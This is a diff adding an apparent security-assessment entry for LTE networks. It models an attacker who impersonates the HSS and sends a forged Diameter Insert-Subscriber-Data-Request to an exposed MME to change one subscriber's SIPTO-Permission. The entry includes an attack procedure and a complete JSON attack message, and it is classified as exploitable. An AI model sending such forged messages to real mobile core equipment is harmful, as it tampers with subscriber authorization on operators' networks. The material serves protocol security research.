@@ -1,0 +1,136 @@
+### **Threat Model:**
+- **Attack Assumption:**  
+  The S6a interface of an MME is exposed to the public Internet due to misconfiguration. An attacker can impersonate the normal sender of an Insert-Subscriber-Data-Request, i.e. the HSS, and send a forged Diameter Request to the MME. The MME does not use IPsec/TLS and accepts the attacker as a peer.
+- **Attacker Capability:**  
+  The attacker can send exactly one `Insert-Subscriber-Data-Request` and passively receive the corresponding Answer.
+
+### **Exploitability Analysis:**
+`SIPTO-Permission` in `Subscription-Data.APN-Configuration-Profile.APN-Configuration.SIPTO-Permission` is a true subscriber-provisioning control field, not mere metadata.
+
+The path is nested as follows:
+
+- `Subscription-Data` (grouped)
+- `APN-Configuration-Profile` (grouped)
+- `APN-Configuration` (grouped, repeatable)
+- `SIPTO-Permission` (leaf)
+
+Because `APN-Configuration` is repeatable, the affected record is selected by the `Context-Identifier` in that APN entry, and in practice identified by `Service-Selection` as the APN name.
+
+If the MME accepts the spoofed `Insert-Subscriber-Data-Request`, it will treat the enclosed `Subscription-Data` as HSS-authoritative subscriber state. Within the selected `APN-Configuration` entry, it can store or overwrite the `SIPTO-Permission` value for that subscriber/APN. That is durable subscriber context in the MME until later overwrite, detach/context deletion, or fresh subscription download.
+
+This is field-specific: the attacker is not merely causing a generic IDR update, but specifically changing whether SIPTO is permitted for one APN configuration entry. That modified value is later consumed during APN-specific handling such as attach default PDN processing or UE-requested PDN connectivity for that APN. The effect is an APN-scoped authorization/service-behavior change: SIPTO/local-offload handling may be permitted or suppressed for that APN depending on the forged enum value.
+
+The realistic impact is limited but concrete:
+
+- one subscriber,
+- one `APN-Configuration` entry,
+- one APN-specific service parameter,
+- realized on later PDN/session handling rather than immediately on IDR receipt.
+
+This does not justify broad claims like generic attach failure, wrong APN naming, or generic QoS corruption. But it is still an exploitable control point because the field itself changes stored subscription authorization state for that APN.
+
+### **Attack Procedure:**
+The attacker crafts a minimal `Insert-Subscriber-Data-Request` containing:
+
+- required Diameter routing/session AVPs,
+- `User-Name` for the target IMSI,
+- `Subscription-Data`,
+- `APN-Configuration-Profile`,
+- one selected `APN-Configuration` entry with `Context-Identifier` and `Service-Selection`,
+- the target `SIPTO-Permission` set to an attacker-chosen valid enumerated value.
+
+The attacker sends the request to the victim MME while impersonating the HSS.
+
+**Success condition:** the MME accepts the IDR and updates the stored APN subscription record for that subscriber so that the targeted APN now carries the forged `SIPTO-Permission` value, affecting later SIPTO-related APN handling.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "request_flag": true,
+    "command_code": 319,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "hss01.example.net;1717670001"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avps": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss01.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "mme01.epc.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "epc.example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "Subscription-Data",
+      "grouped_avps": [
+        {
+          "avp_name": "APN-Configuration-Profile",
+          "grouped_avps": [
+            {
+              "avp_name": "Context-Identifier",
+              "avp_value": 1
+            },
+            {
+              "avp_name": "All-APN-Configurations-Included-Indicator",
+              "avp_value": 0
+            },
+            {
+              "avp_name": "APN-Configuration",
+              "grouped_avps": [
+                {
+                  "avp_name": "Context-Identifier",
+                  "avp_value": 1
+                },
+                {
+                  "avp_name": "Service-Selection",
+                  "avp_value": "internet"
+                },
+                {
+                  "avp_name": "SIPTO-Permission",
+                  "avp_value": 1
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
